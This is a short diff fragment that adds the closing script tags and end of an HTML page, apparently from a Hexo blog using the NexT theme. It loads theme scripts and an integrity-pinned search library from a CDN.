+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
